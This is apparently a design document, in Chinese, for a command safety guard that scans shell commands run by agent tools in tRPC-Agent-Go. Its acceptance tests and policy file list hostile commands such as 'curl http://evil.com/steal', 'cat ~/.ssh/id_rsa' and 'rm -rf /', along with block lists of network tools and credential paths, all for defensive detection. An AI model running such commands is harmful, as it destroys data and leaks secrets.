# Tool Execution Safety Guard — 架构分析与设计方案

## 1. 问题陈述

tRPC-Agent-Go 中的 `workspaceexec`、`hostexec`、`codeexec` 等工具能让 Agent 执行任意 shell 命令。这类能力是 Agent 自动化的关键，但也带来安全风险：

- **危险命令**：`rm -rf`、覆盖系统目录、读取凭据文件
- **网络外连**：`curl`/`wget`/`nc` 访问非白名单域名
- **Shell 绕过**：`sh -c`、`bash -c`、`eval`、反引号、`$()` 绕过命令名检查
- **宿主机风险**：hostexec PTY 长会话、后台进程、提权命令
- **依赖安装**：`pip install`、`npm install`、`apt install` 等
- **资源滥用**：超时、超大输出、无限循环
- **敏感信息泄漏**：命令输出中含 API Key / token / 私钥

**核心矛盾：hostexec 完全没有安全集成，workspaceexec 仅在命令名层面做了 shellsafe 检查（不检查命令参数内容），缺少统一的命令内容扫描、结构化报告和审计追踪。**

---

## 2. 现有安全机制全景图

```
                         ┌──────────────────────────────────────┐
                         │     functioncall.go 处理器            │
                         │                                      │
                         │  checkToolPermission()               │
                         │    ├─ tool.PermissionChecker (工具级) │
                         │    └─ tool.PermissionPolicy  (运行级) │
                         │         ↓ 返回 Allow / Deny / Ask    │
                         │  executeTool()                       │
                         └──────────────────────────────────────┘
                                          │
            ┌─────────────────────────────┼─────────────────────────────┐
            │                             │                             │
            ▼                             ▼                             ▼
   ┌──────────────────┐    ┌──────────────────────────┐    ┌──────────────────┐
   │  tool/hostexec   │    │  tool/workspaceexec      │    │  tool/codeexec   │
   │                  │    │                          │    │                  │
   │  ❌ 零安全集成    │    │  ✅ shellsafe 命令名检查  │    │  ⚠️ 依赖底层      │
   │  ❌ 无 env scrub  │    │  ✅ envscrub 环境净化    │    │    codeexecutor   │
   │  ❌ 无 command    │    │  ✅ CleanEnv 隔离       │    │    的安全实现     │
   │     policy       │    │  ❌ 不检查命令参数内容    │    │                  │
   │  ❌ 裸机 shell    │    │  ❌ 不检查网络目标      │    │                  │
   └──────────────────┘    └──────────────────────────┘    └──────────────────┘
```

### 2.1 `internal/shellsafe` 的能力边界

| 能力 | 覆盖 |
|------|------|
| 命令结构解析（拒绝 `$()`、反引号、重定向、subshell） | ✅ |
| 管道分段检查（`|`、`&&`、`||`、`;`） | ✅ |
| 命令名 allow/deny lists（含 60+ 隐式 deny 集） | ✅ |
| **命令参数内容扫描**（如 `curl http://evil.com` 中 `evil.com`） | ❌ |
| **访问路径检测**（如 `cat ~/.ssh/id_rsa`） | ❌ |
| **网络目标白名单**（提取 URL 并与白名单比对） | ❌ |
| **依赖安装检测**（`pip install` 等） | ❌ |
| **资源限制检查**（timeout / 输出大小） | ❌ |
| **结构化报告输出** | ❌ |
| **审计事件 JSONL** | ❌ |

**结论：shellsafe 是命令名层面的守卫，解决了"谁在执行"的问题，但没解决"在做什么"的问题。**

### 2.2 workspaceexec vs hostexec 安全对比

| 维度 | workspaceexec (有 policy) | hostexec (现状) |
|------|---------------------------|-----------------|
| 命令结构校验 | shellsafe 解析 | ❌ 无 |
| 命令黑/白名单 | shellsafe Policy + implicit deny | ❌ 无 |
| shell 绕过防护 | implicitDeny: sh, bash, eval, sudo, xargs... | ❌ 无 |
| 环境变量净化 | envscrub + CleanEnv=true | ❌ 无 |
| 文件系统 | workspace 隔离目录 | 裸机文件系统（高危） |
| 网络 | 取决于 runtime capabilities | 无限制 |
| 进程管理 | Engine 管理生命周期 | 需自行 SIGKILL |

---

## 3. 设计方案

### 3.1 定位：shellsafe 之上的一层

```
用户命令字符串
    │
    ▼
┌─────────────────────────────┐
│  shellsafe.Parse(command)   │  ← 现有：结构校验 + 命令名 allow/deny
│  → 拒绝 $()、反引号、重定向  │
│  → 拒绝 sh/bash/eval/sudo... │
│  → 允许/拒绝具体命令名       │
└─────────────────────────────┘
    │ 通过
    ▼
┌─────────────────────────────┐
│  SafetyGuard.Scan(command)  │  ← 新增：内容级风险扫描
│  → 危险命令参数 (rm -rf /)  │
│  → 网络目标白名单检查        │
│  → 敏感路径访问检测          │
│  → 依赖安装检测              │
│  → 资源限制检查              │
│  → 结构化报告 + 审计事件     │
└─────────────────────────────┘
    │
    ▼
  allow / deny / ask
```

### 3.2 核心类型

#### SafetyPolicy（可配置策略文件）

```go
// 从 YAML/JSON 加载，修改后无需改代码
type SafetyPolicy struct {
    Version string

    // 命令规则
    DeniedCommands     []string   // 危险命令黑名单
    AllowedCommands    []string   // 安全命令白名单
    DeniedPathPatterns []string   // 禁止访问路径的 regex 模式

    // 网络规则
    AllowedDomains       []string // 域名白名单
    BlockedNetworkTools  []string // 禁止的网络工具 (curl, wget, nc...)

    // 资源限制
    MaxTimeoutSec    int
    MaxOutputBytes   int64

    // 自动拒绝的风险等级
    AutoDenyRiskLevels []string  // ["critical", "high"]

    // 敏感信息模式
    SensitivePatterns []SensitivePattern
}
```

#### ScanReport（结构化扫描报告）

```go
type ScanReport struct {
    Decision    Decision      // allow / deny / ask
    RiskLevel   RiskLevel     // critical / high / medium / low / none
    ToolName    string
    Backend     string        // workspaceexec / hostexec / codeexec
    Command     string
    Findings    []RuleFinding // 所有命中的规则
    Intercepted bool          // 是否被拦截
    DurationMs  int64
    Timestamp   time.Time
}

type RuleFinding struct {
    RuleID         string   // 如 "R1-DANGEROUS-DELETE"
    RiskLevel      RiskLevel
    Category       string   // dangerous_cmd / network / shell_bypass / ...
    Evidence       string   // 匹配到的具体文本
    Recommendation string
}
```

#### AuditEvent（审计事件）

```go
type AuditEvent struct {
    Timestamp    time.Time
    ToolName     string
    Backend      string
    Command      string
    Decision     Decision
    RiskLevel    RiskLevel
    RuleIDs      []string
    Intercepted  bool
    DurationMs   int64
    Sanitized    bool    // 敏感数据是否已脱敏
    SessionID    string
    InvocationID string
}
```

### 3.3 集成方式

SafetyGuard 实现 `tool.PermissionChecker` 接口，利用 `functioncall.go` 中已有的 `checkToolPermission()` 调用点，**无需修改框架核心代码**：

```go
// 方式 1: 作为工具包装器（覆盖特定工具）
type SafetyGuard struct { ... }

func (g *SafetyGuard) CheckPermission(
    ctx context.Context, req *tool.PermissionRequest,
) (tool.PermissionDecision, error) {
    // 1. 从 req.Arguments (JSON) 提取命令和元数据
    // 2. 调用 shellsafe.Parse(command) — 复用现有结构校验
    // 3. 运行内容级风险扫描
    // 4. 根据 policy.AutoDenyRiskLevels 决策
    // 5. 写入审计 JSONL
    // 6. 注入 OTEL span attributes
    // 7. 返回 Allow / Deny / Ask
}
```

```go
// 使用示例
guard := safety.NewSafetyGuard(
    safety.WithPolicyFile("tool_safety_policy.yaml"),
    safety.WithAuditFile("tool_safety_audit.jsonl"),
)

// 作为 PermissionPolicy 注入 Runner
runner := runner.NewRunner("app", agent)
events, _ := runner.Run(ctx, userID, sessionID, msg,
    agent.WithToolPermissionPolicy(guard.AsPermissionPolicy()),
)
```

### 3.4 7 类风险检测规则

| # | 风险类别 | Rule ID 前缀 | 检测方法 |
|---|---------|-------------|---------|
| 1 | 危险命令 | `R1-CMD` | 模式匹配：`rm -rf /`、`mkfs`、`dd if=`、`chmod 777`、`> /dev/sda` |
| 2 | 网络外连 | `R2-NET` | 提取 curl/wget/nc/ssh 的目标 URL/主机，与域名白名单比对 |
| 3 | Shell 绕过 | `R3-SHELL` | **由 shellsafe 覆盖**：拒绝 `$()`/反引号/implicitDeny；新增：base64 编码检测 |
| 4 | 宿主机风险 | `R4-HOST` | 检测后台运行(`&`)、sudo/su/doas、PTY + background 组合 |
| 5 | 依赖安装 | `R5-INSTALL` | 匹配 `install` 子命令：pip/npm/go/apt/cargo/brew install, `curl \| bash` |
| 6 | 资源滥用 | `R6-RES` | timeout 超限、`/dev/zero` 输出、`fork bomb` 特征、sleep 过长 |
| 7 | 敏感泄漏 | `R7-LEAK` | 正则匹配：AWS key、GitHub token、JWT、私钥头、password= |

### 3.5 目录结构

```
trpc-agent-go/
├── internal/toolsafety/          # 核心扫描引擎（internal，不承诺 API 稳定）
│   ├── scanner.go                # Scanner 类型：编排所有规则
│   ├── rules.go                  # 内置规则定义
│   ├── policy.go                 # SafetyPolicy + YAML/JSON 加载
│   ├── report.go                 # ScanReport / AuditEvent / RuleFinding
│   ├── telemetry.go              # OTEL span attribute 注入
│   └── scanner_test.go           # 单元测试（mock shellsafe parser）
├── tool/safety/                  # 公开包装器
│   ├── safety_guard.go           # SafetyGuard：实现 PermissionChecker
│   └── options.go                # WithXxx 函数式选项
├── examples/tool_safety_guard/   # 示例 + 验收测试
│   ├── main.go                   # 可运行的示例
│   ├── tool_safety_policy.yaml   # 示例策略配置
│   ├── tool_safety_report.json   # 示例扫描报告
│   ├── tool_safety_audit.jsonl   # 示例审计日志
│   └── test_cases_test.go        # 12 条验收用例
```

### 3.6 策略文件示例（关键配置项）

```yaml
version: "1.0"

denied_commands: [rm, mkfs, dd, shutdown, reboot, chmod, chown, kill]
allowed_commands: [echo, ls, cat, head, tail, grep, find, wc, git, go, python3, node]

denied_path_patterns:
  - "~/\\.ssh"
  - "~/\\.aws"
  - "~/\\.gcloud"
  - "/etc/(shadow|passwd)"
  - "\\.env$"
  - "\\.pem$"
  - "id_rsa"

allowed_domains: [api.github.com, pkg.go.dev, proxy.golang.org]
blocked_network_tools: [curl, wget, nc, ncat, ssh, telnet, ftp]

max_timeout_sec: 300
max_output_bytes: 10485760

auto_deny_risk_levels: [critical, high]

sensitive_patterns:
  - {name: aws_key,     pattern: "AKIA[0-9A-Z]{16}"}
  - {name: github_token, pattern: "gh[pousr]_[A-Za-z0-9_]{36}"}
  - {name: private_key,  pattern: "-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----"}

backend_overrides:
  hostexec:
    auto_deny_risk_levels: [critical, high, medium]  # 更严格
    max_timeout_sec: 60
```

---

## 4. 12 条验收测试用例

| # | 测试场景 | 命令 | 预期 Decision | 触发规则 |
|---|---------|------|--------------|---------|
| 1 | 安全命令 | `go test ./...` | allow | — |
| 2 | 危险删除 | `rm -rf /important/data` | deny | R1-CMD |
| 3 | 读取密钥 | `cat ~/.ssh/id_rsa` | deny | R1-CMD (sensitive path) |
| 4 | 非白名单网络 | `curl http://evil.com/steal` | deny | R2-NET |
| 5 | 白名单网络请求 | `curl https://api.github.com/repos` | allow | — |
| 6 | shell wrapper 绕过 | `bash -c "rm -rf /"` | deny | R3-SHELL (shellsafe implicitDeny) |
| 7 | 管道命令 | `ls \| grep secret \| xargs cat` | deny | R3-SHELL (xargs implicitDeny) |
| 8 | 依赖安装 | `pip install malicious-package` | deny | R5-INSTALL |
| 9 | 长时间运行 | `sleep 3600` | deny | R6-RES |
| 10 | 超大输出 | `find / -name "*.log"` | deny | R6-RES |
| 11 | hostexec 提权 | `sudo systemctl stop firewall` | deny | R4-HOST |
| 12 | 人工复核场景 | `git clone https://untrusted.com/repo.git` | ask | R2-NET (unknown domain) |

**验收标准：**
- 高危样本（#2, #3, #4, #6, #8, #11）检出率 ≥ 90%：**#2, #3, #4 必须达到 100%**
- 安全样本（#1, #5）误报率 ≤ 10%
- 单次扫描（500 行脚本）耗时 ≤ 1 秒
- 报告包含 decision、risk level、rule id、evidence、recommendation 五项

---

## 5. 与现有系统的关系（设计文档核心章节）

### 5.1 SafetyGuard ↔ shellsafe

**shellsafe** 是 SafetyGuard 的**前置步骤**。SafetyGuard 内部调用 `shellsafe.Parse()` 做结构校验和命令名检查，通过后才进行内容级扫描。两者是**叠加关系**，不是替代关系。

```
shellsafe 回答：这个命令的语法是否合法？执行者是否在允许名单上？
SafetyGuard 回答：这个命令实际要做什么？参数中是否有危险目标？
```

### 5.2 SafetyGuard ↔ PermissionPolicy

SafetyGuard **实现** `tool.PermissionChecker` 接口，通过 `functioncall.go` 中已有的 `checkToolPermission()` 调用点工作。这是框架已有的拦截点：在 `executeTool()` 之前先检查权限。**零框架改动**。

```go
// functioncall.go 已有流程（无需修改）：
checker, ok := semanticTool.(tool.PermissionChecker)
decision, err := checker.CheckPermission(ctx, req)
// decision.Action == Deny/Ask → 跳过 executeTool
```

### 5.3 SafetyGuard ↔ workspaceexec

workspaceexec 现有 `checkCommandPolicy()` 在 `prepareExec()` 中调用 shellsafe。SafetyGuard 在这一层**之前**运行（通过 PermissionChecker），在 JSON 参数阶段就拦截，比 `prepareExec()` 更早。

workspaceexec 的 envscrub + CleanEnv 机制继续独立运作，与 SafetyGuard 互补。

### 5.4 SafetyGuard ↔ hostexec

hostexec 是目前**最危险的执行路径**：裸机 shell，零安全集成。SafetyGuard 是 hostexec 的**第一道防线**。

对 hostexec，SafetyGuard 需要额外检测：
- PTY + background 的组合（长会话风险）
- sudo/su/doas（提权）
- `/dev` 和 `/proc` 访问
- 进程残留风险（`&`、`nohup`、`disown`）

### 5.5 SafetyGuard ↔ sandbox（为什么不能替代沙箱隔离）

| 维度 | SafetyGuard | OS Sandbox (bubblewrap/Seatbelt) |
|------|-------------|----------------------------------|
| **工作层面** | 执行前静态分析 | 运行时 OS 级隔离 |
| **防御范围** | 已知危险模式 | 任意恶意行为 |
| **绕过难度** | 混淆/编码可能绕过 | 极难绕过（kernel 级强制） |
| **资源限制** | 配置中的 timeout/输出限制 | cgroups namespace 硬限制 |
| **文件系统** | 路径模式匹配 | OverlayFS / tmpfs / 只读挂载 |
| **网络** | 域名白名单 | Network namespace / seccomp |
| **0day 防御** | ❌ 不覆盖 | ✅ 进程隔离限制 blast radius |

**SafetyGuard 是门禁（做决策），沙箱是围墙（做隔离），两者互补。** SafetyGuard 阻止已知危险命令进入执行阶段；沙箱确保即使 SafetyGuard 漏掉，执行环境本身也是受限的。

### 5.6 SafetyGuard ↔ Telemetry

SafetyGuard 在 `CheckPermission()` 中注入 OTEL span attributes：

```
tool.safety.decision   = "deny"
tool.safety.risk_level = "high"
tool.safety.rule_id    = "R1-DANGEROUS-DELETE"
tool.safety.backend    = "hostexec"
```

通过现有的 OpenTelemetry tracing 链路（`telemetry/trace/`、`telemetry/langfuse/`），这些属性直接进入分布式追踪，无需额外埋点。

---

## 6. 关键设计决策

### 决策 1：选择 internal 而非直接公开 API

**理由**：扫描引擎的规则集、报告格式和策略 schema 在早期需要快速迭代。放到 `internal/toolsafety/` 可以在不破坏 API 承诺的情况下调整内部结构。对外只暴露 `tool/safety/` 中的 `SafetyGuard` 类型。

### 决策 2：实现 PermissionChecker 而非修改 functioncall.go

**理由**：`functioncall.go` 已经有 `checkToolPermission()` 方法，按 `PermissionChecker → PermissionPolicy` 优先级链执行。SafetyGuard 实现 `PermissionChecker` 即自动接入此链，**零框架改动**。

### 决策 3：shellsafe 不改动，在原位置继续工作

**理由**：shellsafe 的命令结构解析和命令名策略是独立且完整的功能。SafetyGuard 在 shellsafe 基础上叠加内容扫描，不修改 shellsafe 任何代码。如果用户只需要命令名检查，shellsafe 仍然可以独立使用。

### 决策 4：YAML 策略文件，不硬编码规则

**理由**：不同部署环境的安全需求差异大。策略文件支持：
- 修改变更后无需重新编译
- 不同环境使用不同策略（生产/测试/开发）
- 运维团队可以直接编辑，不需要 Go 知识

### 决策 5：hostexec 和 workspaceexec 统一扫描，但分开出报告

**理由**：两类工具的风险模型不同（workspaceexec 有隔离，hostexec 裸机），策略中的 `backend_overrides` 支持按后端差异化配置，报告中 `backend` 字段区分来源。

---

## 7. 实施计划

### 第一阶段：核心扫描引擎（不依赖任何外部服务）

1. `internal/toolsafety/policy.go` — SafetyPolicy 结构 + YAML 加载
2. `internal/toolsafety/rules.go` — 7 类内置规则
3. `internal/toolsafety/scanner.go` — Scanner 编排
4. `internal/toolsafety/report.go` — ScanReport / AuditEvent
5. `internal/toolsafety/scanner_test.go` — 单元测试

### 第二阶段：公开包装器 + 集成

6. `tool/safety/safety_guard.go` — SafetyGuard 实现 PermissionChecker
7. `tool/safety/options.go` — 配置选项

### 第三阶段：示例 + 验收

8. `examples/tool_safety_guard/tool_safety_policy.yaml` — 策略示例
9. `examples/tool_safety_guard/main.go` — 可运行示例
10. `examples/tool_safety_guard/test_cases_test.go` — 12 条验收测试
11. `examples/tool_safety_guard/README.md` — 使用文档 + 安全边界说明

### 第四阶段（可选后续）

12. `internal/toolsafety/telemetry.go` — OTEL span 属性注入
13. 在 `examples/tool_safety_guard/` 中补充 hostexec 集成示例
14. `tool/hostexec/` 中集成 shellsafe + SafetyGuard（将 hostexec 的安全空白补上）
